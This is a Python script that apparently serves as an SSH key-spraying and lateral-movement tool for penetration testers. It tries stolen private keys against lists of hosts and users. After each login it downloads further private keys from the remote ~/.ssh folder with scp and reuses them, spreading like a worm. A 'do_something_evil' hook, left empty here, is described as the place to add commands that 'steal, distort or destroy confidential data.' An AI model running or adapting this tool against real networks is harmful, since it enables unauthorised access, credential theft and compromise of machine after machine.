#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice,
#  this list of conditions and the following disclaimer in the documentation
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.

import os
import re

re_login = re.compile(r'Please login as the user "(.*)" rather than')


def run_ssh_command(user, key, host, command):
    '''
    Run the specified command on the host.
    '''

    cmd = 'ssh -i {0} {1}@{2} "{3}"'.format(key, user, host, command)

    output = os.popen4(cmd)
    resp = output[1].read()

    # Check for common errors and return None

    if resp.find('Permission denied') > -1:
        return None

    # If no errors then return output of command

    return resp


def do_something_evil(user, key, host):
    '''
    For penetration testers, this is called post exploitation and the list of
    commands that are run would yield data used for exploiting other machines
    on the network or for exfiltration. For Shaun and Tatu, this is where the
    SSH super virus does its dirty work :). It is left up to the user to add
    the appropriate commands to "steal, distort or destroy confidential data."
    '''

    evil_commands = []

    for cmd in evil_commands:
        resp = run_ssh_command(user, key, host, cmd)
        if resp is not None:
            print resp


def download_new_key(user, key, host, file):
    '''Use SCP to copy new key files from the remote server.'''

    print '[*] Attempting to download key {0}'.format(file)
    src = '{0}@{1}:.ssh/{2}'.format(user, host, file)
    dst = '{0}-{1}_{2}'.format(user, host, file)
    cmd = 'scp -i {0} {1} {2}'.format(key, src, dst)

    output = os.popen4(cmd)
    resp = output[1].read()

    # Check for common errors and return None

    if resp.find('not a regular file') > -1:
        print '[-] Unable to download key file {0}\n'.format(dst)

    # If no errors then key file was downloaded

    print '[+] New key file {0} downloaded.\n'.format(dst)
    if dst not in new_keys:
        new_keys.append(dst)


def login_with_key(user, key, host):
    '''
    Attempt to login to the SSH server at host with the user and key.
    '''

    print '[*] Attempting login to {0} with user {1} and key {2}'.format(host,
            user, key)
    resp = run_ssh_command(user, key, host, 'ls .ssh')

    if resp is None:
        print '[-] Login to {0}@{1} with key {2} failed\n'.format(user,
                host, key)
    else:
        m = re_login.search(resp)
        if m is not None:

            # Received a message stating we need to login as a different user.

            print '[-] Login to {0}@{1} with key {2} failed\n'.format(user,
                    host, key)
        else:
            print '[+] Login to {0}@{1} with key {2} succeeded'.format(user,
                    host, key)
            for line in resp.split('\n'):
                if line == 'authorized_keys':
                    continue
                if line == 'known_hosts':
                    continue
                if line == 'config':
                    continue
                if line == '':
                    continue
                download_new_key(user, key, host, line)
            do_something_evil(user, key, host)


def load_keys():
    '''
    Load the initial set of SSH keys from the current directory. Prefix the
    key filename with "username-" to use the specified username otherwise root
    will be used. I assume the username will start with [a-z] and contain only
    [a-z0-9_], if that is not the case, modify the regex at the top of the
    script. Files with the extension ".pub" will be ignored.
    '''

    keys = []
    print '[*] Loading SSH keys from current directory.'
    for file in os.listdir('.'):
        if file.endswith('.pub'):
            continue
        if file == 'users':
            continue
        if file == 'hosts':
            continue
        if file == os.path.basename(__file__):
            continue
        keys.append(file)

    return keys


def load_users():
    '''
    Load user accounts from a file called 'users' in the current directory.
    '''

    u = []
    print '[*] Loading user accounts.'
    for line in open('users', 'r'):
        if line == '\n':
            continue
        u.append(line.rstrip())

    return u


def load_hosts():
    '''
    Load hostnames/ips from a file called 'hosts' in the current directory.
    '''

    h = []
    print '[*] Loading hosts.'
    for line in open('hosts', 'r'):
        if line == '\n':
            continue
        h.append(line.rstrip())

    return h


if __name__ == '__main__':
    users = load_users()
    hosts = load_hosts()
    initial_keys = load_keys()
    new_keys = []

    print '[*] Testing loaded keys.'
    for key in initial_keys:
        for host in hosts:
            for user in users:
                login_with_key(user, key, host)

    print '[*] Testing discovered keys'
    while new_keys != []:
        key = new_keys.pop(0)
        for host in hosts:
            for user in users:
                login_with_key(user, key, host)
